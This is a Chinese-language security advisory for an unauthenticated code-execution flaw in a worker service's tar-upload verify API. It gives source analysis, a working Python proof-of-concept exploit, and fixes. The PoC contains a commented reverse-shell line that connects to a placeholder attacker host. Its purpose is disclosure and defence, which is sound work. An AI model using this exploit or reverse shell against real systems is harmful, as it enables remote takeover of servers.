# SA-001: Remote Code Execution via Unauthenticated Worker API

## 漏洞概述

**漏洞类型**: 代码注入 (Code Injection)  
**CWE**: CWE-94 (Improper Control of Generation of Code)  
**严重性**: Critical  
**置信度**: 95/100

AIKG Worker Service 的 `/api/v1/verify`, `/api/v1/profile`, `/api/v1/generate_reference` 等接口接受用户上传的 tar 包，解压后直接执行其中的 Python 脚本，**无需任何认证或代码验证**。攻击者可上传包含恶意 Python 代码的 tar 包，获得远程代码执行能力，完全控制 Worker 服务器。

---

## 源码分析

### 入口点: worker/server.py (第54-89行)

```python
@app.post("/api/v1/verify")
async def verify(
    package: UploadFile = File(...),
    task_id: str = Form(...),
    op_name: str = Form(...),
    timeout: int = Form(300)
):
    # 无认证检查
    package_data = await package.read()  # 读取用户上传的数据
    
    # 直接调用 worker.verify() 处理用户数据
    success, log, artifacts = await worker.verify(package_data, task_id, op_name, timeout)
```

**关键问题**:
- FastAPI 装饰器 `@app.post` 暴露 HTTP 接口到所有网络
- `UploadFile` 参数接受任意文件内容
- 无认证 token、签名或白名单机制

### 漏洞核心: local_worker.py (第81-117行)

```python
async def verify(self, package_data: Union[bytes, str], task_id: str, op_name: str, timeout: int = 300):
    # 解压用户上传的 tar 包
    with tarfile.open(tar_path, 'r') as tar_ref:
        tar_ref.extractall(extract_dir)  # 无路径验证，直接解压
    
    # 根据用户提供的 op_name 查找脚本
    script_name = f"verify_{op_name}.py"  # op_name 来自 HTTP Form 参数
    script_path = os.path.join(extract_dir, script_name)
    
    # 直接执行用户上传的脚本
    process = await asyncio.create_subprocess_exec(
        *cmd,  # cmd = [python_exe, script_name]
        cwd=extract_dir,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE
    )
```

**漏洞触发点**:
1. `tarfile.extractall()` - 解压用户控制的 tar 包内容
2. `asyncio.create_subprocess_exec()` - 执行解压后的 Python 脚本
3. `op_name` 参数可控制脚本名称查找逻辑

## 概念验证 (PoC)

```python
import tarfile
import io
import requests

# 1. 构造恶意 Python 脚本
malicious_script = """
import os
import subprocess
# 执行任意命令
result = subprocess.run(['id'], capture_output=True, text=True)
print(f"RCE SUCCESS: {result.stdout}")
# 反弹 shell 示例 (实际攻击中使用)
# subprocess.Popen(['bash', '-c', 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'])
"""

# 2. 创建 tar 包
def create_malicious_tar():
    tar_buffer = io.BytesIO()
    with tarfile.open(fileobj=tar_buffer, mode='w') as tar:
        # 脚本名必须匹配 verify_{op_name}.py 格式
        script_name = "verify_exploit.py"
        script_bytes = malicious_script.encode('utf-8')
        tarinfo = tarfile.TarInfo(name=script_name)
        tarinfo.size = len(script_bytes)
        tar.addfile(tarinfo, io.BytesIO(script_bytes))
    return tar_buffer.getvalue()

# 3. 发送攻击请求
def exploit_rce(target_url="http://worker-server:9001"):
    tar_data = create_malicious_tar()
    
    response = requests.post(
        f"{target_url}/api/v1/verify",
        files={"package": ("exploit.tar", tar_data)},
        data={
            "task_id": "attack-001",
            "op_name": "exploit",  # 匹配脚本名 verify_exploit.py
            "timeout": 60
        }
    )
    
    print(f"Response: {response.status_code}")
    print(f"Output: {response.json()}")

# 执行攻击
exploit_rce()
```

**预期结果**: 服务器返回执行日志，包含 `id` 命令输出，证明 RCE 成功。

### 2. 中期修复

```python
# 限制 tar 包内容验证
import re

def validate_tar_contents(tar_path: str, allowed_patterns: list) -> bool:
    """验证 tar 包内容是否符合预期"""
    with tarfile.open(tar_path, 'r') as tar:
        for member in tar.getmembers():
            # 只允许 .py 脇件
            if not member.name.endswith('.py'):
                return False
            # 禁止路径穿越
            if '..' in member.name or member.name.startswith('/'):
                return False
            # 验证文件名格式
            if not any(re.match(p, member.name) for p in allowed_patterns):
                return False
    return True

# 使用沙箱执行
# 使用 subprocess 时限制权限
# 使用 namespaces/cgroups 隔离
```

### 3. 长期修复

- **架构层面**: Worker 与 Server 分离，Server 验证后才转发任务
- **网络层面**: Worker 只监听内网地址，通过 VPN/防火墙隔离
- **运行层面**: Worker 使用受限容器（Docker/K8s），无宿主机访问权限
- **审计层面**: 记录所有执行脚本内容，异常检测
